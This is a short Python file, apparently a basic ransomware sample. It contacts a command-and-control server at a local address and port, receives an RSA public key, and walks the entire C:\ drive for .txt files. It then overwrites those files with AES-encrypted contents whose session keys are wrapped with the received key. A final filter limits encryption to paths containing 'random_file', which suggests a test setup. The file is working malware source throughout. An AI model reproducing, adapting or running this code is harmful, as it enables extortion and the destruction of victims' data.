import os
import socket

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES



# Macros for Connection with C&C Server
IP_ADDRESS = '127.0.0.1'
PORT = 5678

# get_files grabs all the files from C:\ that have extension in encrypted_extensions
def get_files(encrypted_extensions):
    file_paths = []
    for root, dirs, files in os.walk('C:\\'):
        for file in files:
            file_path, file_extension = os.path.splitext(root+'\\'+file)
            if file_extension in encrypted_extensions:
                file_paths.append(root+'\\'+file)
    return file_paths

def encrypt(dataFile, public_key_file):
    with open(dataFile, 'rb') as f:
        data = f.read()
        data = bytes(data)

        with open (public_key_file, 'rb') as pkF: 
            publicKey = pkF.read()
            key = RSA.import_key(publicKey)
       
        sessionKey = os.urandom(16)

        cipher = PKCS1_OAEP.new(key)
        encryptedSessionKey = cipher.encrypt(sessionKey)

        cipher = AES.new(sessionKey, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        with open(dataFile, 'wb') as f:
            [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
        
        print('Done Encrypting: ' + dataFile)



# Execution Starts Here!S
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP_ADDRESS, PORT))
    public_key = s.recv(1024)
    with open('public_key.pem', 'wb') as f:
        f.write(public_key)
    s.close()

encrypted_extensions = ('.txt',) # all the extensions that will be encrypted

file_paths = get_files(encrypted_extensions)

for f in file_paths:
    if 'random_file' in f:
        encrypt(f, 'public_key.pem')